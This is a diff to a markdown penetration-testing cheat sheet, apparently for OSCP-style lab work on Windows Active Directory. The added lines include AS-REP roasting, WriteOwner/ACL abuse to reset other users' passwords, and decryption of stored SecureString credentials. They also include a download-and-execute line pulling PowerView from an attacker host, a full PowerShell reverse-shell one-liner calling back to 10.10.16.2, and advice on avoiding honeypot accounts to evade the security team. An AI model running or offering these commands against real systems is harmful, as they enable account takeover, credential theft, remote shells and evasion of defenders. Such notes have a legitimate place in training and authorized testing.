@@ -645,7 +645,7 @@ kerbrute userenum users.txt -d example.com --dc 127.0.0.1
 This will get a "ticket" meaning the users have the "UF_DONT_REQUIRE_PREAUTH" set and will return a hash to crack
 
 ```
-python3 /usr/local/bin/GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 127.0.0.1
+python3 /usr/local/bin/GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
 ```
 
 #### Kerberosting
@@ -986,6 +986,73 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Principal
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Credential $Cred
 ```
 
+*WriteOwner* (For User)
+
+
+```
+$Password = ConvertTo-SecureString '@Password!' -AsPlainText -Force
+```
+
+```
+$TargetUser = 'TargetUser'
+```
+
+```
+$CompromisedUser = 'CompromisedUser'
+```
+
+```
+Set-DomainObjectOwner -Identity $TargetUser -OwnerIdentity $CompromisedUser
+```
+
+```
+Add-DomainObjectAcl -TargetIdentity $TargetUser -PrincipalIdentity $CompromisedUser -Rights all
+```
+
+```
+set-adaccountpassword -identity $TargetUser -reset -newpassword $Password
+```
+
+Or
+
+```
+Set-DomainUserPassword -Identity $TargetUser -accountpassword $Password
+```
+
+*Uncover Secure String Passwords
+
+If credentials are in an xml
+
+```
+$cred = Import-Clixml -Path .\credentials.xml
+```
+
+```
+[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred))
+```
+
+```
+$cred.GetNetworkCredential().password
+```
+
+Using only the password string
+
+```
+$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748111' | convertto-securestring
+```
+
+```
+$user = 'domain\user'
+```
+
+```
+$cred = New-Object System.Management.Automation.PSCredential $user,$pass
+```
+
+```
+$cred.getnetworkcredential() | fl
+```
+
 ### Samba/SMB
 
 *When testing with smb try with null sessions, anonymous, and valid credentials*
@@ -1320,8 +1387,42 @@ https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
     - check `C:\Program Files (x86)\SystemScheduler\Events` log files. for any running events. this is similar to linux cronjobs.
 ### PowerView Commands
 
-	
-  - powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.119.241:8080/powerview.ps1');Get-NetLoggedon -ComputerName DC01"
+Load PowerView.ps1 in memory
+
+```
+IEX (New-Object Net.Webclient).downloadstring("http://AttackingIP/powerview.ps1")
+```
+
+Enumerate All but the most interesting group using
+
+```
+get-ngroup
+```
+
+```
+get-objectacl -SamAccountName "Interesting Group" -ResolveGUIDs
+```
+
+Depending on the user or group found in "IdentityReference" from the output  `get-objectacl -SamAccountName "Interesting Group" -ResolveGUIDs`  run.
+
+```
+Get-ObjectAcl -SamAccountName "IdentityReference" -ResolveGUIDs
+```
+
+```
+Invoke-ACLScanner | select objectdn,activedirectoryrights,identityreference | fl
+```
+
+Look for Passwords in User Descriptions
+
+```
+find-userfield -SearchField description "password"
+find-userfield -SearchField description "pass"
+```
+
+
+
+ - powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.119.241:8080/powerview.ps1');Get-NetLoggedon -ComputerName DC01"
   - Get-DomainGroup -MemberIdentity SomeUser | select samaccountname
   - Get-NetComputer | select operatingsystem - gets a list of all operating systems on the domain
   - Get-NetUser | select cn - gets a list of all users on the domain
@@ -1336,7 +1437,12 @@ https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
   - (Get-DomainPolicy)."system access"
   - Get-NetUser | select <command> eg select cn, description
   - Get-userProperty -Properties pwdlastset
-  - Get -UserProperty -Properties logoncount : don't attack accounts with low logoncount because they might be honeypot account. As soon as you compromise it, the security team will be alerted of your presence.
+
+Don't attack accounts with low logoncount because they might be honeypot account. As soon as you compromise it, the security team will be alerted of your presence
+
+```
+Get -UserProperty -Properties logoncount
+```
 
 - If a group has `WriteDacl` privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them `DCSync` privileges.
   1. `net user thescriptkid thescriptkid /add /domain`
@@ -1485,6 +1591,8 @@ https://attack.mitre.org/software/
 Set the Mona Configuration `!mona config -set workingfolder c:\mona\%p`
 
 ### Fuzzing
+
+Try later https://github.com/AceSineX/BOF-fuzzer-python-3-All-in
 
 Run a fuzzer and it will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.
 
@@ -1647,7 +1755,7 @@ powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('192.168.
 
 ### Reverse Powershell using windows command shell
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.203',80);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
 ### CMD Runas
@@ -2285,7 +2393,13 @@ attack scenario #2 via self hosted webserver
 
 ### Parse for users
 ```
-cat 20220818000314_users.json| jq .data[].Properties.samaccountname | cut -d '"' -f2
+cat *_users.json| jq .data[].Properties.samaccountname | cut -d '"' -f2
+```
+
+Or
+
+```
+cat *_users.json| jq .data[].Properties.name | cut -d '"' -f2
 ```
 
 ### Parse for groups
